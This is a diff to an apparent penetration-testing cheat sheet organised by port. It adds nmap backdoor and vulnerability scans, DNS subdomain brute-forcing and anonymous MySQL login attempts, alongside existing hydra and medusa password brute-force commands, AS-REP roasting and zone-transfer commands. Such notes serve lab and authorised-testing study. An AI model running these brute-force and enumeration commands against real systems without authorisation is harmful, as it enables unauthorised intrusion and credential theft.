@@ -10,10 +10,12 @@ qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost sm
 
 ### Port 21 (FTP)
 ftp anonymous@$rhost #21
+nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -Pn $rhost
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp; exec zsh'" & disown
 qterminal -e "zsh -c 'medusa -u \$user -P ~/rockyou.txt -h \$rhost -M ftp; exec zsh'" & disown
 
 ### Port 2121 (FTP)
+nmap -sV -p2121 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -Pn $rhost
 ftp anonymous@$rhost -P 2121 #2121
 nmap --script ftp* -p2121 -Pn $rhost #2121
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp -s 2121; exec zsh'" & disown
@@ -44,16 +46,19 @@ impacket-GetNPUsers -no-pass -usersfile users.txt $domain -dc-ip $rhost #88
 kerbrute userenum --domain $shortdomain users.txt --dc $rhost #88
 
 ### Port 25 (SMTP)
+nmap -sV -p25 --script smtp-commands,smtp-open-relay -Pn $rhost
 smtp-user-enum -U /seclists/Usernames/Names/names.txt -t $rhost -m 150 #25
 smtp-user-enum -M VRFY -w 30 -U users.txt -t $rhost -v #25
 smtp-user-enum -M RCPT -U users.list -D $domain -t $rhost #25
 
 ### Port 53 (DNS)
 dig $domain @$rhost #53
-dig any www.$domain #53
 dig axfr $domain @$rhost #53
+dig any $domain @$rhost #53
+dig any www.$domain #53
 dig axfr internal.$domain @$rhost #53
 dig axfr ns1.$domain @$rhost @ns.$domain #53
+qterminal -e "zsh -c 'for dnsname in \$(cat /usr/share/seclists/Discovery/DNS/namelist.txt); do host \$dnsname.\$domain \$rhost; done | grep \"has address\"; exec zsh'" & disown
 
 ### Port 80 (HTTP)
 anyHTTP including 8080 etc
@@ -75,7 +80,9 @@ cadaver http://$rhost/maybe-it-cred-requires #80
 wafw00f -v https://$domain #443
 
 ### Port 3306 (MySQL)
-mysql -u $user -h $rhost #3306 try with no password
+mysql -u $user -h $rhost #3306 try with no password #3306
+mysql -h $rhost -u "" -p"" #3306
+nmap -sV -p3306 --script mysql-info,mysql-variables -Pn $rhost #3306
 
 ### Port 3389 (RDP)
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost rdp; exec zsh'" & disown
